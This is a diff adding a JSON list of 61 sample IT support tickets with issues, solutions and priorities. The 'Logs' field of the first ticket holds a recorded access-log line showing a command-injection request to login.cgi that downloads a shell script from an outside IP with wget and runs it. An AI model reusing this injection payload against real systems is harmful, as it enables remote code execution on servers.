@@ -1,0 +1,672 @@
+[
+    {
+        "id": 0,
+        "title": "Login Failure",
+        "issue": "Users are unable to log in to the application.",
+        "solution": "Reset the server and check the authentication service.",
+        "category": "Bug",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High",
+            "Logs": "37.139.5.66 - - [30/Oct/2024:10:17:06 +0200] \"GET /login.cgi?cli=aa%20aa%27;wget%20http://193.35.18.164/klausschwab.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1\" 400 150 \"-\" \"linus-torvalds-loves-you\""
+        }
+    },
+    {
+        "id": 1,
+        "title": "Data Not Saving",
+        "issue": "Changes made by users are not being saved.",
+        "solution": "Check database connection and query execution.",
+        "category": "Database",
+        "custom_fields": {
+            "Affected Module": "User Profile",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 2,
+        "title": "Page Load Timeout",
+        "issue": "The homepage takes too long to load.",
+        "solution": "Optimize images and check server response time.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Browsers": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 3,
+        "title": "Email Notifications Not Sending",
+        "issue": "Users are not receiving email notifications.",
+        "solution": "Verify email server settings and SMTP configuration.",
+        "category": "Email",
+        "custom_fields": {
+            "Affected Users": "Select Users",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 4,
+        "title": "404 Error on Profile Page",
+        "issue": "Users receive a 404 error when trying to access their profile.",
+        "solution": "Check routing and ensure the profile page exists.",
+        "category": "Routing",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 5,
+        "title": "Slow Database Queries",
+        "issue": "Some queries are taking too long to execute.",
+        "solution": "Optimize the database indices and queries.",
+        "category": "Database",
+        "custom_fields": {
+            "Affected Tables": "Users, Orders",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 6,
+        "title": "Mobile Responsiveness Issue",
+        "issue": "The website is not displaying properly on mobile devices.",
+        "solution": "Adjust CSS media queries and test on various devices.",
+        "category": "UI/UX",
+        "custom_fields": {
+            "Affected Devices": "iPhone, Android",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 7,
+        "title": "Payment Gateway Failure",
+        "issue": "Users cannot complete transactions.",
+        "solution": "Check the payment gateway API status and logs.",
+        "category": "Payment",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 8,
+        "title": "Session Timeout Issue",
+        "issue": "User sessions are timing out too quickly.",
+        "solution": "Increase the session timeout duration in settings.",
+        "category": "Authentication",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 9,
+        "title": "Search Function Not Working",
+        "issue": "The search feature is returning no results.",
+        "solution": "Check the search algorithm and indexing process.",
+        "category": "Functionality",
+        "custom_fields": {
+            "Affected Modules": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 10,
+        "title": "User Profile Update Failure",
+        "issue": "Users are unable to update their profile information.",
+        "solution": "Check validation rules and database connections.",
+        "category": "User Profile",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 11,
+        "title": "Browser Compatibility Issues",
+        "issue": "Website does not render properly in Firefox.",
+        "solution": "Test and update CSS for compatibility with Firefox.",
+        "category": "UI/UX",
+        "custom_fields": {
+            "Affected Browsers": "Firefox",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 12,
+        "title": "File Upload Limit Exceeded",
+        "issue": "Users cannot upload files larger than 2MB.",
+        "solution": "Increase file upload size limit in server configuration.",
+        "category": "File Management",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 13,
+        "title": "Password Reset Email Not Sending",
+        "issue": "Users do not receive password reset emails.",
+        "solution": "Check email service configuration and logs.",
+        "category": "Email",
+        "custom_fields": {
+            "Affected Users": "Select Users",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 14,
+        "title": "API Rate Limiting Error",
+        "issue": "API requests are being blocked due to rate limits.",
+        "solution": "Adjust rate limits in API configuration.",
+        "category": "API",
+        "custom_fields": {
+            "Affected Endpoints": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 15,
+        "title": "Data Migration Failure",
+        "issue": "Data migration to the new system is failing.",
+        "solution": "Review migration scripts and logs for errors.",
+        "category": "Database",
+        "custom_fields": {
+            "Affected Data": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 16,
+        "title": "SSL Certificate Expiration",
+        "issue": "SSL certificate for the website has expired.",
+        "solution": "Renew the SSL certificate immediately.",
+        "category": "Security",
+        "custom_fields": {
+            "Affected Domains": "example.com",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 17,
+        "title": "Account Lockout Issue",
+        "issue": "Users are getting locked out after multiple failed attempts.",
+        "solution": "Increase the number of allowed login attempts.",
+        "category": "Authentication",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 18,
+        "title": "Content Not Displaying",
+        "issue": "Some content is not appearing on the website.",
+        "solution": "Check CMS settings and content publishing status.",
+        "category": "Content",
+        "custom_fields": {
+            "Affected Pages": "Home, About",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 19,
+        "title": "Analytics Not Recording",
+        "issue": "Website analytics are not being recorded.",
+        "solution": "Verify tracking code implementation and configuration.",
+        "category": "Analytics",
+        "custom_fields": {
+            "Affected Pages": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 20,
+        "title": "Insufficient Permissions",
+        "issue": "Some users do not have sufficient permissions.",
+        "solution": "Review user roles and permissions settings.",
+        "category": "Permissions",
+        "custom_fields": {
+            "Affected Users": "Select Users",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 21,
+        "title": "Incorrect Data Display",
+        "issue": "Users see incorrect data in reports.",
+        "solution": "Check data aggregation logic and calculations.",
+        "category": "Data Integrity",
+        "custom_fields": {
+            "Affected Reports": "Sales Report",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 22,
+        "title": "Cache Not Clearing",
+        "issue": "Cached data is not updating as expected.",
+        "solution": "Review cache settings and purge cache manually.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Modules": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 23,
+        "title": "Error 500 on API Requests",
+        "issue": "Users are receiving a 500 error on API calls.",
+        "solution": "Check server logs for errors and exceptions.",
+        "category": "API",
+        "custom_fields": {
+            "Affected Endpoints": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 24,
+        "title": "User Feedback Form Not Submitting",
+        "issue": "Feedback form submissions are failing.",
+        "solution": "Check form validation and server-side processing.",
+        "category": "Feedback",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 25,
+        "title": "Video Playback Issues",
+        "issue": "Embedded videos do not play on the site.",
+        "solution": "Verify video player settings and compatibility.",
+        "category": "Media",
+        "custom_fields": {
+            "Affected Browsers": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 26,
+        "title": "Browser Caching Issues",
+        "issue": "Old content is showing due to caching.",
+        "solution": "Instruct users to clear their browser cache.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 27,
+        "title": "Analytics Dashboard Not Loading",
+        "issue": "Users cannot access the analytics dashboard.",
+        "solution": "Check database connectivity and server health.",
+        "category": "Analytics",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 28,
+        "title": "Security Vulnerability Detected",
+        "issue": "Potential security vulnerability found in the application.",
+        "solution": "Perform security audit and patch vulnerabilities.",
+        "category": "Security",
+        "custom_fields": {
+            "Affected Modules": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 29,
+        "title": "Form Validation Errors",
+        "issue": "Users are encountering validation errors on forms.",
+        "solution": "Review form validation rules and error handling.",
+        "category": "User Experience",
+        "custom_fields": {
+            "Affected Forms": "Contact Us",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 30,
+        "title": "Cross-Site Scripting Vulnerability",
+        "issue": "XSS vulnerability detected in user input fields.",
+        "solution": "Sanitize all user inputs to prevent XSS attacks.",
+        "category": "Security",
+        "custom_fields": {
+            "Affected Modules": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 31,
+        "title": "User Permissions Not Saving",
+        "issue": "Changes to user permissions are not being saved.",
+        "solution": "Check database save logic for user permissions.",
+        "category": "User Management",
+        "custom_fields": {
+            "Affected Users": "Admin Users",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 32,
+        "title": "Application Crash on Load",
+        "issue": "The application crashes upon loading.",
+        "solution": "Check server logs for errors and resource usage.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Modules": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 33,
+        "title": "Search Results Not Displaying",
+        "issue": "Search results are not showing for users.",
+        "solution": "Verify search index and data availability.",
+        "category": "Functionality",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 34,
+        "title": "Backup Process Failure",
+        "issue": "Automated backup process is failing.",
+        "solution": "Check backup scripts and storage availability.",
+        "category": "Backup",
+        "custom_fields": {
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 35,
+        "title": "Localization Issues",
+        "issue": "Some text is not translated in the application.",
+        "solution": "Review localization files and translations.",
+        "category": "Localization",
+        "custom_fields": {
+            "Affected Languages": "French, Spanish",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 36,
+        "title": "Chat Feature Not Working",
+        "issue": "The chat feature is not functioning for users.",
+        "solution": "Check WebSocket connection and server settings.",
+        "category": "Functionality",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 37,
+        "title": "Data Export Failure",
+        "issue": "Users cannot export data from the application.",
+        "solution": "Check export function and permissions.",
+        "category": "Data Management",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 38,
+        "title": "API Documentation Outdated",
+        "issue": "API documentation is not up-to-date.",
+        "solution": "Review and update API documentation.",
+        "category": "Documentation",
+        "custom_fields": {
+            "Affected APIs": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 39,
+        "title": "Content Delivery Network (CDN) Issues",
+        "issue": "CDN is not serving resources correctly.",
+        "solution": "Check CDN configuration and cache settings.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Resources": "Images, Scripts",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 40,
+        "title": "Server Overload",
+        "issue": "Server is experiencing high load and slow response times.",
+        "solution": "Scale server resources and review load balancer settings.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 41,
+        "title": "User Account Deactivation Issues",
+        "issue": "Users cannot deactivate their accounts.",
+        "solution": "Review account deactivation logic and permissions.",
+        "category": "User Management",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 42,
+        "title": "Reporting Feature Not Functioning",
+        "issue": "The reporting feature is not generating reports.",
+        "solution": "Check reporting logic and data sources.",
+        "category": "Reporting",
+        "custom_fields": {
+            "Affected Reports": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 43,
+        "title": "Network Connectivity Issues",
+        "issue": "Users are experiencing intermittent network connectivity.",
+        "solution": "Check server network configuration and health.",
+        "category": "Network",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 44,
+        "title": "Session Storage Issues",
+        "issue": "User session data is not being stored properly.",
+        "solution": "Check session storage configuration.",
+        "category": "Authentication",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 45,
+        "title": "Data Import Errors",
+        "issue": "Users are encountering errors when importing data.",
+        "solution": "Review import function and error handling.",
+        "category": "Data Management",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 46,
+        "title": "Legacy Code Issues",
+        "issue": "Legacy code is causing compatibility issues.",
+        "solution": "Refactor legacy code and ensure compatibility.",
+        "category": "Code Quality",
+        "custom_fields": {
+            "Affected Modules": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 47,
+        "title": "Security Audit Recommendations Not Implemented",
+        "issue": "Previous security audit recommendations have not been implemented.",
+        "solution": "Review and implement all outstanding recommendations.",
+        "category": "Security",
+        "custom_fields": {
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 48,
+        "title": "Unexpected Application Behavior",
+        "issue": "Users report unexpected behavior in the application.",
+        "solution": "Investigate user reports and server logs.",
+        "category": "Functionality",
+        "custom_fields": {
+            "Affected Users": "Select Users",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 49,
+        "title": "Third-party Integration Failure",
+        "issue": "Integration with third-party service is failing.",
+        "solution": "Check API keys and service status.",
+        "category": "Integration",
+        "custom_fields": {
+            "Affected Services": "Payment Gateway",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 50,
+        "title": "Unresponsive Design Elements",
+        "issue": "Certain design elements are unresponsive.",
+        "solution": "Review CSS and HTML for responsive design issues.",
+        "category": "UI/UX",
+        "custom_fields": {
+            "Affected Elements": "Buttons, Links",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 51,
+        "title": "Error Messages Not Displaying",
+        "issue": "Error messages are not visible to users.",
+        "solution": "Ensure error messages are displayed in the UI.",
+        "category": "User Experience",
+        "custom_fields": {
+            "Affected Pages": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 52,
+        "title": "Slow Loading Times",
+        "issue": "Pages are loading slowly for users.",
+        "solution": "Optimize images and reduce server response time.",
+        "category": "Performance",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 53,
+        "title": "Multiple Login Attempts Detected",
+        "issue": "Multiple failed login attempts detected for an account.",
+        "solution": "Implement account lockout mechanism after failed attempts.",
+        "category": "Security",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 54,
+        "title": "Server Maintenance Notification",
+        "issue": "Users are not receiving notifications about server maintenance.",
+        "solution": "Check notification settings and delivery mechanisms.",
+        "category": "Communication",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 55,
+        "title": "Inconsistent UI Behavior",
+        "issue": "UI behavior is inconsistent across different browsers.",
+        "solution": "Test UI across major browsers and resolve discrepancies.",
+        "category": "UI/UX",
+        "custom_fields": {
+            "Affected Browsers": "Chrome, Firefox, Safari",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 56,
+        "title": "Incorrect User Data Displayed",
+        "issue": "Users see incorrect data displayed in their profiles.",
+        "solution": "Check data retrieval logic and user permissions.",
+        "category": "User Management",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 57,
+        "title": "Data Synchronization Issues",
+        "issue": "Data is not synchronizing across devices.",
+        "solution": "Investigate synchronization logic and network issues.",
+        "category": "Data Management",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "High"
+        }
+    },
+    {
+        "id": 58,
+        "title": "Payment Processing Errors",
+        "issue": "Users cannot complete payment transactions.",
+        "solution": "Check payment gateway integration and logs.",
+        "category": "Payment",
+        "custom_fields": {
+            "Affected Users": "All",
+            "Priority": "Critical"
+        }
+    },
+    {
+        "id": 59,
+        "title": "User Feedback Form Not Submitting",
+        "issue": "Users cannot submit feedback forms.",
+        "solution": "Review form submission logic and error handling.",
+        "category": "User Experience",
+        "custom_fields": {
+            "Affected Forms": "Feedback",
+            "Priority": "Medium"
+        }
+    },
+    {
+        "id": 60,
+        "title": "Browser Compatibility Issues",
+        "issue": "Application is not working correctly on older browsers.",
+        "solution": "Implement polyfills and check compatibility.",
+        "category": "Compatibility",
+        "custom_fields": {
+            "Affected Browsers": "Internet Explorer 11",
+            "Priority": "High"
+        }
+    }
+]
